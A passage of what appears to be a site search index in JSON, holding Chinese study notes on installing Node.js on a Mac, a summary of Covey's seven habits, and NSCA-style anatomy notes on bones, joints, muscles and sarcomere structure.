Node.js\u670d\u52a1\u7aef\u63a5\u53d7\u540e\u7aef\u6570\u636e\uff0c\u5904\u7406\u6570\u636e\uff0c\u7136\u540e\u63a8\u9001\u5230\u524d\u7aef","title":"\u524d\u7aef\u65f6\u4ee3\u7684\u53d8\u9769"},{"location":"programming_language/vue/%E5%AE%89%E8%A3%85nodejs/","text":"\u5b89\u88c5node.js mac\u4e0b\u5b89\u88c5 \u4e0b\u8f7d|\u8282\u70b9.js (nodejs.org) \u8be5\u7f51\u7ad9\u4e2d\u9009\u62e9mac\u5b89\u88c5\u5305\uff0c\u76f4\u63a5\u6253\u5f00\u5b89\u88c5\u5305\uff0c\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u5b89\u88c5\u597d\u4e86 ~ % node --version v16.15.1 ~ % npm -v 8.11.0","title":"\u5b89\u88c5nodejs"},{"location":"programming_language/vue/%E5%AE%89%E8%A3%85nodejs/#nodejs","text":"","title":"\u5b89\u88c5node.js"},{"location":"programming_language/vue/%E5%AE%89%E8%A3%85nodejs/#mac","text":"\u4e0b\u8f7d|\u8282\u70b9.js (nodejs.org) \u8be5\u7f51\u7ad9\u4e2d\u9009\u62e9mac\u5b89\u88c5\u5305\uff0c\u76f4\u63a5\u6253\u5f00\u5b89\u88c5\u5305\uff0c\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u5b89\u88c5\u597d\u4e86 ~ % node --version v16.15.1 ~ % npm -v 8.11.0","title":"mac\u4e0b\u5b89\u88c5"},{"location":"soft/7%E4%B8%AA%E4%B9%A0%E6%83%AF/","text":"\u201c\u9ad8\u6548\u80fd\u4eba\u58eb\u7684\u4e03\u4e2a\u4e60\u60ef\u201d\u662f\u7531\u53f2\u8482\u82ac\u00b7\u67ef\u7ef4\uff08Stephen R. Covey\uff09\u5728\u4ed6\u7684\u8457\u4f5c\u300a\u9ad8\u6548\u80fd\u4eba\u58eb\u7684\u4e03\u4e2a\u4e60\u60ef\u300b\uff08The 7 Habits of Highly Effective People\uff09\u4e2d\u63d0\u51fa\u7684\u3002\u8fd9\u4e9b\u4e60\u60ef\u65e8\u5728\u5e2e\u52a9\u4e2a\u4eba\u63d0\u9ad8\u6548\u7387\u548c\u5b9e\u73b0\u4e2a\u4eba\u548c\u804c\u4e1a\u76ee\u6807\u3002\u4ee5\u4e0b\u662f\u8fd9\u4e03\u4e2a\u4e60\u60ef\uff1a \u79ef\u6781\u4e3b\u52a8\uff08Be Proactive\uff09 \uff1a \u4f60\u662f\u81ea\u5df1\u751f\u6d3b\u7684\u4e3b\u5bfc\u8005\u3002\u79ef\u6781\u4e3b\u52a8\u610f\u5473\u7740\u4f60\u5bf9\u81ea\u5df1\u7684\u884c\u4e3a\u3001\u6001\u5ea6\u548c\u60c5\u7eea\u8d1f\u8d23\uff0c\u800c\u4e0d\u662f\u88ab\u5916\u90e8\u73af\u5883\u6240\u5de6\u53f3\u3002\u91c7\u53d6\u79ef\u6781\u7684\u6001\u5ea6\uff0c\u4e3b\u52a8\u89e3\u51b3\u95ee\u9898\uff0c\u800c\u4e0d\u662f\u7b49\u5f85\u95ee\u9898\u7684\u89e3\u51b3\u3002 \u4ee5\u7ec8\u4e3a\u59cb\uff08Begin with the End in Mind\uff09 \uff1a \u786e\u5b9a\u4f60\u7684\u76ee\u6807\u548c\u613f\u666f\uff0c\u7136\u540e\u4ee5\u6b64\u4e3a\u57fa\u7840\u5236\u5b9a\u8ba1\u5212\u3002\u6e05\u6670\u5730\u77e5\u9053\u81ea\u5df1\u60f3\u8981\u4ec0\u4e48\uff0c\u5e76\u671d\u7740\u8fd9\u4e2a\u76ee\u6807\u52aa\u529b\u3002\u7f16\u5199\u4e2a\u4eba\u4f7f\u547d\u58f0\u660e\uff0c\u660e\u786e\u81ea\u5df1\u7684\u4ef7\u503c\u89c2\u548c\u76ee\u6807\u3002 \u8981\u4e8b\u7b2c\u4e00\uff08Put First Things First\uff09 \uff1a \u4f18\u5148\u5904\u7406\u6700\u91cd\u8981\u7684\u4e8b\u60c5\uff0c\u5b66\u4f1a\u533a\u5206\u91cd\u8981\u548c\u7d27\u6025\u7684\u4efb\u52a1\u3002\u4e13\u6ce8\u4e8e\u90a3\u4e9b\u5bf9\u5b9e\u73b0\u4f60\u7684\u76ee\u6807\u548c\u613f\u666f\u6700\u6709\u5e2e\u52a9\u7684\u6d3b\u52a8\uff0c\u800c\u4e0d\u662f\u88ab\u7410\u4e8b\u548c\u7d27\u6025\u4f46\u4e0d\u91cd\u8981\u7684\u4efb\u52a1\u6240\u5206\u6563\u6ce8\u610f\u529b\u3002 \u53cc\u8d62\u601d\u7ef4\uff08Think Win-Win\uff09 \uff1a \u5728\u4e0e\u4ed6\u4eba\u4e92\u52a8\u65f6\uff0c\u5bfb\u6c42\u4e92\u5229\u5171\u8d62\u7684\u89e3\u51b3\u65b9\u6848\u3002\u5efa\u7acb\u57fa\u4e8e\u4fe1\u4efb\u548c\u4e92\u5229\u7684\u5173\u7cfb\uff0c\u800c\u4e0d\u662f\u7ade\u4e89\u548c\u5bf9\u6297\u3002\u76f8\u4fe1\u6709\u8db3\u591f\u7684\u8d44\u6e90\u548c\u6210\u529f\u53ef\u4ee5\u5206\u4eab\u7ed9\u6bcf\u4e2a\u4eba\u3002 \u77e5\u5f7c\u89e3\u5df1\uff08Seek First to Understand, Then to Be Understood\uff09 \uff1a \u5728\u4e0e\u4ed6\u4eba\u6c9f\u901a\u65f6\uff0c\u5148\u503e\u542c\u5e76\u7406\u89e3\u5bf9\u65b9\u7684\u89c2\u70b9\u548c\u9700\u6c42\uff0c\u7136\u540e\u518d\u8868\u8fbe\u81ea\u5df1\u7684\u60f3\u6cd5\u3002\u6709\u6548\u7684\u6c9f\u901a\u9700\u8981\u540c\u7406\u5fc3\u548c\u8010\u5fc3\uff0c\u53ea\u6709\u771f\u6b63\u7406\u89e3\u5bf9\u65b9\uff0c\u624d\u80fd\u8fbe\u6210\u66f4\u597d\u7684\u5408\u4f5c\u548c\u89e3\u51b3\u65b9\u6848\u3002 \u7edf\u5408\u7efc\u6548\uff08Synergize\uff09 \uff1a \u53d1\u6325\u56e2\u961f\u5408\u4f5c\u7684\u529b\u91cf\uff0c\u5229\u7528\u6bcf\u4e2a\u4eba\u7684\u72ec\u7279\u624d\u80fd\u548c\u6280\u80fd\uff0c\u8fbe\u5230\u534f\u540c\u6548\u5e94\u3002\u901a\u8fc7\u5408\u4f5c\u548c\u4e92\u8865\uff0c\u521b\u9020\u51fa\u6bd4\u4e2a\u4f53\u5355\u72ec\u52aa\u529b\u66f4\u5927\u7684\u6210\u679c\u3002 \u4e0d\u65ad\u66f4\u65b0\uff08Sharpen the Saw\uff09 \uff1a \u4e0d\u65ad\u66f4\u65b0\u548c\u63d0\u5347\u81ea\u5df1\uff0c\u4fdd\u6301\u8eab\u5fc3\u5065\u5eb7\u3002\u8fd9\u5305\u62ec\u8eab\u4f53\u3001\u5fc3\u667a\u3001\u60c5\u611f\u548c\u7075\u6027\u7684\u5168\u9762\u53d1\u5c55\u3002\u901a\u8fc7\u5b66\u4e60\u3001\u953b\u70bc\u3001\u4f11\u606f\u548c\u53cd\u601d\u6765\u4fdd\u6301\u6d3b\u529b\u548c\u6301\u7eed\u6210\u957f\u3002 \u8fd9\u4e9b\u4e60\u60ef\u4e0d\u4ec5\u9002\u7528\u4e8e\u4e2a\u4eba\u7684\u6210\u957f\u548c\u53d1\u5c55\uff0c\u4e5f\u9002\u7528\u4e8e\u56e2\u961f\u548c\u7ec4\u7ec7\u7684\u63d0\u5347\u3002\u57f9\u517b\u8fd9\u4e9b\u4e60\u60ef\u53ef\u4ee5\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u7ba1\u7406\u81ea\u5df1\u7684\u751f\u6d3b\uff0c\u5b9e\u73b0\u957f\u671f\u7684\u6210\u529f\u548c\u5e78\u798f\u3002","title":"7\u4e2a\u4e60\u60ef"},{"location":"soft/NSCA/","text":"\u4eba\u4f53\u9aa8\u9abc\u6570\u91cf \u4eba\u4f53\u7ea6\u6709206\u5757\u9aa8\u9abc\uff0c\u51c6\u786e\u7684\u6570\u5b57\u53ef\u80fd\u4f1a\u56e0\u4eba\u800c\u5f02\u3002\u8fd9\u79cd\u76f8\u5bf9\u8f83\u8f7b\u4f46\u662f\u5f88\u575a\u56fa\u7684\u7ed3\u6784\u8d77\u5230\u4e86\u63d0\u4f9b\u6760\u6746\u3001\u652f\u6491\u4ee5\u53ca\u4fdd\u62a4\u7684\u4f5c\u7528 \u9aa8\u5bc6\u5ea6\u589e\u52a0 \u6709\u51e0\u79cd\u60c5\u51b5\u53ef\u4ee5\u5bf9\u6210\u4eba\u9aa8\u9abc\u4ea7\u751f\u6b63\u9762\u5f71\u54cd\uff0c\u8fd9\u5176\u4e2d\u5927\u591a\u6570\u662f\u4f7f\u7528\u808c\u8089\u7684\u7ed3\u679c\u3002\u5f53\u8eab\u4f53\u627f\u53d7\u8f83\u5927\u8d1f\u8377(\u5de5\u4f5c\u548c \u6297\u963b\u8bad\u7ec3 )\u65f6\uff0c\u9aa8\u5bc6\u5ea6\u548c\u9aa8\u77ff\u7269\u8d28\u542b\u91cf\u5c06\u589e\u52a0\u3002\u5982\u679c\u8eab\u4f53\u6267\u884c \u5177\u6709\u8f83\u5f3a\u51b2\u51fb\u6027\u548c\u7206\u53d1\u6027\u7684\u52a8\u4f5c \uff0c\u4e5f\u53ef\u80fd\u53d1\u751f\u7c7b\u4f3c\u7684\u53d8\u5316\u3002\u7c7b\u4f3c\u7684\u9aa8\u5bc6\u5ea6\u63d0\u9ad8\u7684\u60c5\u51b5\u5728\u4ece\u4e8b\u4f53\u64cd\u6d3b\u52a8\uff0c\u6216\u5176\u4ed6\u6d89\u53ca\u9ad8\u529b\u91cf\u3001\u9ad8\u7206\u53d1\u529b\u53ca\u786c\u843d\u5730\u6d3b\u52a8\u7684\u4eba\u7fa4\u4e2d\u90fd\u80fd\u88ab\u89c2\u6d4b\u5230\u3002\u5f71\u54cd\u9aa8\u9abc\u9002\u5e94\u7684\u5176\u4ed6\u56e0\u7d20\u5305\u62ec\u4e2d\u8f74\u9aa8\u662f\u5426\u627f\u53d7\u8d1f\u8377\uff0c\u4ee5\u53ca\u8d1f\u8377\u53d1\u751f\u7684\u9891\u7387\u3002\u7531\u4e8e\u9aa8\u9abc\u7684\u9002\u5e94\u671f\u6bd4\u9aa8\u9abc\u808c\u957f\uff0c\u6240\u4ee5\u6539\u53d8\u523a\u6fc0\u7684\u9891\u7387\u3001\u5f3a\u5ea6\u548c\u5f62\u5f0f\u975e\u5e38\u91cd\u8981\u3002 \u6807\u8bb0\u4e0a\u62fc\u97f3\uff1a \u9501\u9aa8 (su\u01d2 g\u01d4) \u80a9\u80db\u9aa8 (ji\u0101n ji\u01ce g\u01d4) \u80f8\u9aa8 (xi\u014dng g\u01d4) \u80b1\u9aa8 (g\u014dng g\u01d4) \u808b\u9aa8 (l\u00e8i g\u01d4) \u810a\u67f1 (j\u01d0 zh\u00f9) \u9ac2\u5d74 (qi\u00e0 j\u00ed) \u9aa8\u683c (g\u01d4 g\u00e9) \u5c3a\u9aa8 (ch\u01d0 g\u01d4) \u76c6\u9aa8 (p\u00e9n g\u01d4) \u9aa8\u8155 (g\u01d4 w\u00e0n) \u638c\u9aa8 (zh\u01ceng g\u01d4) \u80a1\u9aa8 (g\u01d4 g\u01d4) \u9acc\u9aa8 (b\u00ecn g\u01d4) \u80eb\u9aa8 (j\u00ecng g\u01d4) \u8153\u9aa8 (f\u00e9i g\u01d4) \u8dd6\u9aa8 (zh\u00ed g\u01d4) \u5173\u8282 \u9aa8\u4e0e\u9aa8\u4e4b\u95f4\u7684\u8fde\u7ed3\u53eb\u5173\u8282\u3002\u7ea4\u7ef4\u5173\u8282\uff08\u4f8b\u5982\u9885\u9aa8\u7684\u9aa8\u7f1d)\u51e0\u4e4e\u4e0d\u80fd\u6d3b\u52a8\uff0c\u8f6f\u9aa8\u5173\u8282\uff08\u4f8b\u5982\u690e\u95f4\u76d8)\u7684\u6d3b\u52a8\u8303\u56fa\u6709\u9650\uff0c\u6ed1\u819c\u5173\u8282\uff08\u4f8b\u5982\u8098\u5173\u8282\u548c\u819d\u5173\u8282)\u7684\u6d3b\u52a8\u8303\u56f4\u76f8\u5f53\u5927\u3002\u8fd0\u52a8\u548c\u953b\u70bc\u7684\u52a8\u4f5c\u4e3b\u8981\u56f4\u7ed5\u7740\u6ed1\u819c\u5173\u8282\u53d1\u751f\uff0c\u800c\u6ed1\u819c\u5173\u8282\u7684\u6700\u4e3b\u8981\u7279\u5f81\u662f\u6469\u64e6\u529b\u4f4e\u3001\u6d3b\u52a8\u8303\u56f4\u5927\u3002\u7ec4\u6210\u5173\u8282\u7684\u9aa8\u7684\u672b\u7aef\u8986\u76d6\u7740\u5149\u6ed1\u7684\u900f\u660e\u8f6f\u9aa8\uff0c\u5e76\u4e14\u6574\u4e2a\u5173\u8282\u88ab\u5305\u88f9\u5728\u5145\u6ee1\u6ed1\u6db2\u7684\u5173\u8282\u56ca\u4e2d\u3002\u6ed1\u819c\u5173\u8282\u901a\u5e38\u8fd8\u6709\u97e7\u5e26\u548c\u5173\u8282\u5185\u8f6f\u9aa8\u4f5c\u4e3a\u8f85\u52a9\u7ed3\u6784 \u5173\u8282\u5206\u7c7b \u51e0\u4e4e\u6240\u6709\u7684\u5173\u8282\u8fd0\u52a8\u90fd\u6d89\u53ca\u56f4\u7ed5\uff0c\u70b9\u6216\u8f74\u7684\u65cb\u8f6c\u3002\u5173\u8282\u53ef\u4ee5\u4f9d\u636e\u5176\u80fd\u591f\u53d1\u751f\u65cb\u8f6c\u7684\u65b9\u5411\u7684\u6570\u91cf\u8fdb\u884c\u5206\u7c7b\u3002\u5355\u8f74\u5173\u8282\uff08\u4f8b\u5982\u65f6\u5173\u8282\uff09 \u50cf\u94f0\u94fe\u4e00\u6837\u8fd0\u4f5c\uff0c\u57fa\u672c\u4e0a\u53ea\u56f4\u7ed5\u4e00\u4e2a\u8f74\u65cb\u8f6c\u3002\u819d\u5173\u8282\u7ecf\u5e38\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u94f0\u94fe\u5173\u8282\uff0c\u4f46\u4e8b\u5b9e\u4e0a\uff0c\u5176\u65cb\u8f6c\u8f74\u4f1a\u6839\u636e\u5173\u8282\u6d3b\u52a8\u8303\u56f4\u800c\u53d1\u751f\u6539\u53d8\u3002\u53cc\u8f74\u5173\u8282\uff08\u4f8b\u5982\u8e1d\u5173\u8282\u548c\u8155\u5173\u8282)\u53ef\u4ee5\u56f4\u7ed5\u4e24\u4e2a\u76f8\u4e92\u5782\u76f4\u7684\u8f74\u8f6c\u52a8\u3002\u591a\u8f74\u5173\u8282\uff08\u4f8b\u5982\u80a9\u5173\u8282\u8fd9\u6837\u7684\u7403\u7a9d\u5173\u8282)\u53ef\u4ee5\u56f4\u7ed5\u5b9a\u4e49\u7a7a\u95f4\u7684\u4e09\u4e2a\u76f8\u4e92\u5782\u76f4\u7684\u8f74\u8f6c\u52a8\u3002 \u6807\u8bb0\u4e0a\u62fc\u97f3\uff1a \u4e09\u89d2\u808c (s\u0101n ji\u01ceo j\u012b) \u80f8\u5927\u808c (xi\u014dng d\u00e0 j\u012b) \u80b1\u4e8c\u5934\u808c (g\u014dng \u00e8r t\u00f3u j\u012b) \u8179\u76f4\u808c (f\u00f9 zh\u00ed j\u012b) \u80b1\u808c (g\u014dng j\u012b) \u8179\u5916\u659c\u808c (f\u00f9 w\u00e0i xi\u00e9 j\u012b) \u80b1\u6861\u808c (g\u014dng r\u00e1o j\u012b) \u6307\u5c48\u808c (zh\u01d0 q\u016b j\u012b) \u957f\u6536\u808c (ch\u00e1ng sh\u014du j\u012b) \u80a1\u8584\u808c (g\u01d4 b\u00f3 j\u012b) \u7f1d\u5320\u808c (f\u00e9ng ji\u00e0ng j\u012b) \u80a1\u76f4\u808c (g\u01d4 zh\u00ed j\u012b) \u80a1\u5916\u4fa7\u808c (g\u01d4 w\u00e0i c\u00e8 j\u012b) \u80a1\u5185\u4fa7\u808c (g\u01d4 n\u00e8i c\u00e8 j\u012b) \u80eb\u9aa8\u524d\u808c (j\u00ecng g\u01d4 qi\u00e1n j\u012b) \u659c\u65b9\u808c (xi\u00e9 f\u0101ng j\u012b) \u5188\u4e0b\u808c (g\u0101ng xi\u00e0 j\u012b) \u5927\u5706\u808c (d\u00e0 yu\u00e1n j\u012b) \u80b1\u4e09\u5934\u808c (g\u014dng s\u0101n t\u00f3u j\u012b) \u80cc\u9614\u808c (b\u00e8i ku\u00f2 j\u012b) \u6307\u4f38\u808c (zh\u01d0 sh\u0113n j\u012b) \u81c0\u5927\u808c (t\u00fan d\u00e0 j\u012b) \u534a\u8171\u808c (b\u00e0n ji\u00e0n j\u012b) \u80a1\u4e8c\u5934\u808c (g\u01d4 \u00e8r t\u00f3u j\u012b) \u534a\u819c\u808c (b\u00e0n m\u00f3 j\u012b) \u8153\u80a0\u808c (f\u00e9i ch\u00e1ng j\u012b) \u6bd4\u76ee\u9c7c\u808c (b\u01d0 m\u00f9 y\u00fa j\u012b) \u808c\u8089\u7ed3\u6784 \u808c\u8089\u8bb2\u89e3 \u6bcf\u4e00\u5757\u9aa8\u9abc\u808c\u90fd\u662f\u4e00\u4e2a\u5305\u542b\u4e86\u808c\u8089\u7ec4\u7ec7\u3001\u7ed3\u7f14\u7ec4\u7ec7\u3001\u795e\u7ecf\u548c\u8840\u7ba1\u7684\u5668\u5b98\u3002\u7ea4\u7ef4\u72b6\u7ed3\u7f14\u7ec4\u7ec7\uff0c\u53c8\u79f0\u808c\u5916\u819c\uff0c\u8986\u76d6\u4e86\u5168\u8eab\u591a\u8fbe430\u4f59\u5757\u9aa8\u9abc\u808c\u3002\u808c\u5916\u819c\u4e0e\u808c\u8089\u672b\u7aef\u7684\u808c\u8171\u76f8\u8fde\uff0c\u808c\u8171\u8fde\u63a5\u7740\u9aa8\u819c\uff0c\u9aa8\u819c\u662f\u8986\u5728\u6240\u6709\u9aa8\u9abc\u8868\u9762\u7684\u7279\u5316\u7ed3\u7f14\u7ec4\u7ec7\uff1b\u4efb\u4f55\u808c\u8089\u7684\u6536\u7f29\u529b\u90fd\u4f1a\u901a\u8fc7\u808c\u8171\u4f20\u5bfc\u81f3\u9aa8\u9abc\u3002\u4e0a\u4e0b\u80a2\u7684\u808c\u8089\u5728\u9aa8\u9abc\u4e0a\u7684\u4e24\u4e2a\u9644\u7740\u7aef\u79f0\u4e3a\u8fd1\u7aef\uff08\u9760\u8fd1\u8eaf\u5e72\uff09\u548c\u8fdc\u7aef(\u8fdc\u79bb\u8eaf\u5e72)\u3002\u8eaf\u5e72\u808c\u8089\u7684\u4e24\u4e2a\u9644\u7740\u7aef\u79f0\u4e3a\u4e0a\u7aef\uff08\u9760\u8fd1\u5934)\u548c\u4e0b\u7aef\uff08\u9760\u8fd1\u811a\uff09\u3002 \u808c\u7ec6\u80de\uff0c\u5e38\u88ab\u79f0\u4e3a\u808c\u7ea4\u7ef4\uff0c\u5448\u957f\u6761\u5f62(\u6709\u65f6\u4e0e\u6574\u6761\u808c\u8089\u7684\u957f\u5ea6\u76f8\u540c\uff0c\u662f\u76f4\u5f84\u4e3a50~100um(\u548c\u4e00\u6839\u5934\u53d1\u7684\u76f4\u5f84\u76f8\u5f53)\u7684\u5706\u7ba1\u72b6\u7ec6\u80de\u3002\u8fd9\u4e9b\u808c\u7ea4\u7ef4\u5728\u5916\u56f4\u6709\u591a\u4e2a\u7ec6\u80de\u6838\uff0c \u5e76\u4e14\u5728\u4f4e\u500d\u663e\u5fae\u955c\u4e0b\u5448\u73b0\u6761\u7eb9\u72b6\u3002\u5728\u808c\u5916\u819c\u5185\uff0c\u6700\u591a\u53ef\u8fbe150\u6839\u5de6\u53f3\u7684\u808c\u7ea4\u7ef4\u805a\u96c6\u6210\u675f(\u808c\u675f)\u3002\u808c\u675f\u88ab\u79f0\u4e3a\u808c\u675f\u819c\u7684\u7ed3\u7f14\u7ec4\u7ec7\u5305\u88f9\u7740\u3002\u6bcf\u6839\u808c\u7ea4\u7ef4\u88ab\u79f0\u4e3a\u808c\u5185\u819c\u7684\u7ed3\u7f14\u7ec4\u7ec7\u5305\u88f9\uff0c\u808c\u5185\u819c\u4e0e\u808c\u7ea4\u7ef4\u819c\u76f8\u8fde\u63a5\u3002\u6240\u6709\u7ed3\u7f14\u7ec4\u7ec7\u808c\u5916\u819c\u3001\u808c\u675f\u819c\u548c\u808c\u5185\u819c\u90fd\u4e0e\u808c\u8171\u76f8\u8fde\uff0c\u6240\u4ee5\u808c\u7ec6\u80de\u4e2d\u4ea7\u751f\u7684\u5f20\u529b\u6700\u7ec8\u4f20\u5bfc\u81f3\u808c\u8171\u548c\u4e0e\u5176\u8fde\u63a5\u7684\u9aa8\u4e0a\u3002 \u808c\u7ec6\u80de\u662f\u5982\u4f55\u88ab\u63a7\u5236\u7684 \u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u548c\u5b83\u6240\u63a7\u5236\u7684\u808c\u7ea4\u7ef4\u7684\u63a5\u5408\u70b9\u79f0\u4e3a\u8fd0\u52a8\u7ec8\u677f\u6216\u795e\u7ecf\u808c\u8089\u63a5\u5934\u3002\u5c3d\u7ba1\u4e00\u6839\u8fd0\u52a8\u795e\u7ecf\u63a7\u5236\u7740\u5f88\u591a\u751a\u81f3\u6210\u767e\u4e0a\u5e72\u6761\u808c\u7ea4\u7ef4\uff0c\u4f46\u6bcf\u4e2a\u808c\u7ec6\u80de\u4ec5\u6709\u4e00\u4e2a\u795e\u7ecf\u808c\u8089\u63a5\u5934\u3002\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u4e0e\u5176\u63a7\u5236\u7684\u808c\u7ea4\u7ef4\u88ab\u79f0\u4e3a\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u3002\u5728\u88ab\u8fd0\u52a8\u795e\u7ecf\u6fc0\u6d3b\u540e\uff0c \u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u4f1a\u540c\u65f6\u6536\u7f29\u3002 \u808c\u7ec6\u80de\u5185\u90e8\u7ed3\u6784 \u808c\u7ea4\u7ef4\u7684\u5185\u90e8\u7ed3\u6784\u5982\u56fe1.5\u6240\u793a\u3002\u808c\u6d46\u662f\u808c\u7ea4\u7ef4\u7684\u7ec6\u80de\u8d28\uff0c\u5305\u542b\u7531\u86cb\u767d\u4e1d\u3001\u5176\u4ed6\u79cd\u7c7b\u86cb\u767d\u8d28\u3001\u50a8\u5907\u7684\u7cd6\u539f\u3001\u8102\u80aa\u9897\u7c92\u3001\u9176\u548c\u7279\u5b9a\u7ec6\u80de\u5668\uff08\u4f8b\u5982\u7ebf\u7c92\u4f53\u548c\u808c\u8d28\u7f51)\u7ec4\u6210\u7684\u6536\u7f29\u6210\u5206\u3002 \u808c\u539f\u7ea4\u7ef4\u5185\u90e8\u7ed3\u6784 \u6570\u767e\u6761\u808c\u539f\u7ea4\u7ef4(\u6bcf\u6761\u76f4\u5f84\u5927\u7ea6\u4e3a1\u03bcm,\u662f\u4e00\u6839\u5934\u53d1\u7684\u76f4\u5f84\u7684\u767e\u5206\u4e4b\u4e00)\u5360\u636e\u4e86\u808c\u6d46\u7684\u5927\u90e8\u5206\u7a7a\u95f4\u3002\u808c\u539f\u7ea4\u7ef4\u5305\u542b\u4f7f\u808c\u7ec6\u80de\u6536\u7f29\u7684\u5668\u5b98\uff0c\u8fd9\u4e00\u5668\u5b98\u4e3b\u8981\u7531\u4e24\u7c7b\u808c\u4e1d\u6784\u6210\uff1a\u808c\u7403\u86cb\u767d\u4e1d\u548c\u808c\u52a8\u86cb\u767d\u4e1d\u3002\u808c\u7403\u86cb\u767d\u4e1d(\u7c97\u808c\u4e1d\uff0c\u76f4\u5f84\u5927\u7ea6\u4e3a16nm,\u76f8\u5f53\u4e8e\u4e00\u6839\u5934\u53d1\u4e1d\u76f4\u5f84\u7684\u4e07\u5206\u4e4b\u4e00)\u6700\u591a\u53ef\u5305\u542b200\u4e2a\u808c\u7403\u86cb\u767d\u5206\u5b50\u3002 \u808c\u7403\u86cb\u767d\u4e1d\u7531\u4e00\u4e2a\u7403\u72b6\u5934\u3001\u4e00\u4e2a\u94f0\u94fe\u70b9\u548c\u4e00\u6761\u7ea4\u7ef4\u5c3e\u90e8\u7ec4\u6210\u3002\u7403\u72b6\u5934\u6309\u89c4\u5f8b\u95f4\u9694\u5206\u5e03\u5728\u808c\u7403\u86cb\u767d\u4e1d\u4e0a\u4e14\u5411\u5916\u7a81\u51fa\uff0c\u4e00\u5bf9\u808c\u7403\u86cb\u767d\u4e1d\u4f1a\u6784\u6210\u6a2a\u6865\uff0c\u4e0e\u808c\u52a8\u86cb\u767d\u76f8\u4e92\u4f5c\u7528\u3002\u808c\u52a8\u86cb\u767d\u4e1d(\u7ec6\u808c\u4e1d\uff0c\u76f4\u5f84\u7ea6\u4e3a6nm)\u75312\u6761\u53cc\u87ba\u65cb\u72b6\u6392\u5217\u7684\u7ec6\u4e1d\u7ec4\u6210\u3002\u808c\u7403\u86cb\u767d\u4e1d\u548c\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u6784\u6210\u9aa8\u9abc\u808c\u7684\u6700\u5c0f\u6536\u7f29\u5355\u4f4d\u2014\u2014 \u808c\u8282 \u5185\uff0c\u7eb5\u5411\u6392\u5217\u3002\u5728\u653e\u677e\u7684\u808c\u7ea4\u7ef4\u4e2d\uff0c\u808c\u8282\u5e73\u5747\u957f\u5ea6\u4e3a2.5\u03bcm(1cm\u957f\u7684\u808c\u8089\u4e2d\u5927\u7ea6\u67094500\u4e2a\u808c\u8282)\"\u3002\u6bcf\u6761\u808c\u7ea4\u7ef4\u7531\u8fde\u7eed\u4e0d\u65ad\u7684\u808c\u8282\u6784\u6210\u3002 \u4e0a\u56fe\u5c55\u793a\u4e86\u808c\u7403\u86cb\u767d\u4e0e\u808c\u52a8\u86cb\u767d\u5728\u808c\u8282\u4e2d\u7684\u7ed3\u6784\u4e0e\u65b9\u5411\u3002\u76f8\u90bb\u7684\u808c\u7403\u86cb\u767d\u4e1d\u5728\u808c\u8282\u4e2d\u592e\u7684M\u6865\u5f7c\u6b64\u76f8\u8fde(H\u533a\u4e2d\u592e)\u3002\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u808c\u8282\u4e24\u7aef\u5bf9\u9f50\u5e76\u56fa\u5b9a\u5728Z\u7ebf\u4e0a\u3002Z\u7ebf\u5728\u6574\u6761\u808c\u539f\u7ea4\u7ef4\u4e0d\u65ad\u91cd\u590d\u30026\u6761\u808c\u52a8\u86cb\u767d\u4e1d\u73af\u7ed51\u6761\u808c\u7403\u86cb\u767d\u4e1d\uff0c3\u6761\u808c\u7403\u86cb\u767d\u4e1d\u73af\u7ed51\u6761\u808c\u52a8\u86cb\u767d\u4e1d\u3002 \u808c\u52a8\u86cb\u767d\u4e1d\u3001\u808c\u7403\u86cb\u767d\u548c\u808c\u8282Z\u7ebf\u6392\u5217\u5f62\u6210\u4e86\u9aa8\u9abc\u808c\u4e0a\u4ea4\u66ff\u51fa\u73b0\u7684\u6df1\u8272\u548c\u6d45\u8272\u7eb9\u6837\uff0c\u653e\u5927\u4e4b\u540e\u5448\u6a2a\u7eb9\u72b6\u3002\u6df1\u8272\u7684A\u5e26\u4e0e\u808c\u7403\u86cb\u767d\u4e1d\u7684\u6392\u5217\u4e00\u81f4\uff0c\u800c\u6d45\u8272\u7684I\u5e26\u5219\u5bf9\u5e94\u7684\u662f2\u6761\u4e34\u8fd1\u808c\u8282\u95f4\u53ea\u5305\u542b\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u90e8\u5206\u3002Z\u7ebf\u4f4d\u4e8eI\u5e26\u4e2d\u592e\uff0c\u662f\u4e00\u6761\u7eb5\u8d2f1\u5e26\u7684\u6df1\u8272\u7ec6\u7ebf\u3002\u808c\u8282\u4e2d\u592e\u7684H\u533a\u53ea\u6709\u808c\u7403\u86cb\u767d\u4e1d\u3002\u5f53\u808c\u8089\u6536\u7f29\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u987a\u7740\u808c\u7403\u86cb\u767d\u6ed1\u5411\u808c\u8282\u4e2d\u592e\uff0c\u8fd9\u65f6H\u533a\u7f29\u77ed\u3002\u5f53Z\u7ebf\u88ab\u62c9\u5411\u808c\u8282\u4e2d\u592e\u65f6\uff0cI\u5e26\u4e5f\u4f1a\u7f29\u77ed\u3002 \u808c\u8d28\u7f51\u662f\u7eb5\u5c0f\u7ba1\u7cfb\u7edf\uff0c\u5b83\u5e73\u884c\u73af\u7ed5\u4e8e\u6bcf\u4e00\u6761\u808c\u539f\u7ea4\u7ef4\uff0c\u5728\u9760\u8fd1Z\u7ebf\u7684\u4f4d\u7f6e\u4f1a\u5f62\u6210\u7ec8\u672b\u6c60\u3002\u9499\u79bb\u5b50\u88ab\u50a8\u5b58\u5728\u8fd9\u4e9b\u7ec8\u672b\u6c60\u4e2d\u3002\u9499\u79bb\u5b50\u7684\u8c03\u8282\u63a7\u5236\u4e86\u808c\u8089\u6536\u7f29\u3002T\u5c0f\u7ba1\u53c8\u79f0\u6a2a\u5c0f\u7ba1\uff0c\u5b83\u7684\u8d70\u5411\u5782\u76f4\u4e8e\u808c\u8d28\u7f51\u5e76\u7ec8\u6b62\u4e8e2\u4e2a\u7ec8\u672b\u6c60\u4e4b\u95f4\u7684Z\u7ebf\u9644\u8fd1\u3002\u56e0\u4e3aT\u5c0f\u7ba1\u5206\u5e03\u57